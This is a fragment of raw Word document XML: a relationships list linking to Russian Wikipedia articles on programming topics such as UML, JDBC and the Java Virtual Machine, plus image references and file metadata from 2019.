Target="https://ru.wikipedia.org/wiki/&#1054;&#1073;&#1098;&#1077;&#1082;&#1090;_(&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;)" TargetMode="External"/><Relationship Id="rId62"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1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D0%B4%D0%B5%D0%BA%D1%81%D0%BD%D1%8B%D0%B9_%D0%BC%D0%B0%D1%81%D1%81%D0%B8%D0%B2" TargetMode="External"/><Relationship Id="rId24"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32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1042;&#1080;&#1079;&#1091;&#1072;&#1083;&#1080;&#1079;&#1072;&#1094;&#1080;&#1103;" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1057;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1086;&#1077;_&#1087;&#1088;&#1086;&#1077;&#1082;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1040;&#1073;&#1089;&#1090;&#1088;&#1072;&#1082;&#1090;&#1085;&#1072;&#1103;_&#1084;&#1086;&#1076;&#1077;&#1083;&#1100;" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1044;&#1080;&#1072;&#1075;&#1088;&#1072;&#1084;&#1084;&#1072;_(UML)" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1044;&#1080;&#1072;&#1075;&#1088;&#1072;&#1084;&#1084;&#1072;" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.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RMI" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D0%B6%D0%B5%D0%BD%D0%B5%D1%80%D0%B8%D1%8F_%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D1%8F" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1041;&#1080;&#1079;&#1085;&#1077;&#1089;-&#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1052;&#1077;&#1090;&#1086;&#1076;_(&#1103;&#1079;&#1099;&#1082;&#1080;_&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1103;)" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D0%B1%D0%BE%D1%80%D0%BA%D0%B0_%D0%BC%D1%83%D1%81%D0%BE%D1%80%D0%B0_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/JDBC" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1040;&#1085;&#1075;&#1083;&#1080;&#1081;&#1089;&#1082;&#1080;&#1081;_&#1103;&#1079;&#1099;&#1082;" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1040;&#1085;&#1075;&#1083;&#1080;&#1081;&#1089;&#1082;&#1080;&#1081;_&#1103;&#1079;&#1099;&#1082;" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1040;&#1085;&#1075;&#1083;&#1080;&#1081;&#1089;&#1082;&#1080;&#1081;_&#1103;&#1079;&#1099;&#1082;" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.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Java_Virtual_Machine" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%82%D0%B5%D0%B2%D0%BE%D0%B9_%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9D%D0%B0%D0%B4%D1%91%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D1%8C" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1052;&#1086;&#1076;&#1077;&#1083;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.jpeg"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1055;&#1086;&#1083;&#1077;_&#1082;&#1083;&#1072;&#1089;&#1089;&#1072;" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://metanit.com/sharp/tutorial/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B9%D1%82-%D0%BA%D0%BE%D0%B4" TargetMode="Externa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ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_(%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D0%BA%D0%B0)" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B7%D0%B0_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/%D0%9D%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0_(%D0%B7%D0%BD%D0%B0%D1%87%D0%B5%D0%BD%D0%B8%D1%8F)" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/w/index.php?title=&#1054;&#1073;&#1098;&#1077;&#1082;&#1090;&#1085;&#1086;&#1077;_&#1084;&#1086;&#1076;&#1077;&#1083;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;&amp;action=edit&amp;redlink=1" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/&#1054;&#1088;&#1075;&#1072;&#1085;&#1080;&#1079;&#1072;&#1094;&#1080;&#1086;&#1085;&#1085;&#1072;&#1103;_&#1089;&#1090;&#1088;&#1091;&#1082;&#1090;&#1091;&#1088;&#1072;" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ru.wikipedia.org/wiki/UML" TargetMode="External"/><Relationship Id="rId59"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A4C6E-A60A-412F-B781-9CAEE726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39</Pages>
  <Words>8442</Words>
  <Characters>48124</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Поликарпов</cp:lastModifiedBy>
  <cp:revision>15</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-05-16T11:29:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-06-06T12:31:00Z</dcterms:modified>
</cp:coreProperties>
</file>